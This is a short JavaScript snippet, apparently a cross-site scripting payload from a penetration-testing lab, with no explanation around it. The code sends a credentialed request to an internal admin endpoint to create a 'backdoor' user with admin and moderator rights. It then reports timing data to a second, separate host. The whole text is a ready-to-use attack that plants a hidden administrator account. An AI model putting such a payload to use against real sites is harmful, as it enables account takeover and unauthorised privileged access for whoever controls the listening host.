```javascript
data = 'name=backdoor&email=pwnd@answers.local&isAdmin=True&isMod=True';
const stime = Date.now();
fetch('http://192.168.121.251/admin/users/create', {
            method: 'POST',    
            credentials:'include',
            headers: {'Content-Type':'application/x-www-form-urlencoded'},
            body: data
}).then((response) => response.text()).then((start) => {
            const etime = Date.now();
            fetch('http://192.168.118.7:9090/?start=' + stime + '&stop=' + etime);
             });
```